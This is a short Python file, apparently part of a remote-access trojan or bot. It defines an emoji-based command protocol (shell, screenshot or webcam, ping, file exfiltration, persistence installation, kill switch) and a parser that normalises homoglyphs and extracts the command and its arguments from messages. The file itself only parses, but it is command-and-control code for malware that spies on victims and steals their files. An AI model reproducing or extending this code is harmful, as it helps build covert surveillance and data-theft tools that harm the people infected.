import unicodedata

# The Protocol
EMOJI_MAP = {
    '🐚': 'cmd_shell',      # System Info
    '📸': 'cmd_screenshot', # Screenshot/Webcam
    '👋': 'cmd_ping',       # Ping
    '📂': 'cmd_exfil',      # Exfiltrate File
    '🔄': 'cmd_persist',    # Install Persistence
    '🛑': 'cmd_exit'        # Kill Switch
}

def normalize_homoglyphs(text):
    return unicodedata.normalize('NFKC', text)

def extract_intent(message_content):
    """
    Returns a Tuple: (Command_ID, Argument_String)
    """
    clean_text = normalize_homoglyphs(message_content)
    
    for emoji, cmd_id in EMOJI_MAP.items():
        if emoji in clean_text:
            # Check for arguments (text after the emoji)
            try:
                args = clean_text.split(emoji)[1].strip()
                # If args is empty string, make it None
                if not args: args = None
                return (cmd_id, args)
            except IndexError:
                return (cmd_id, None)
            
    return None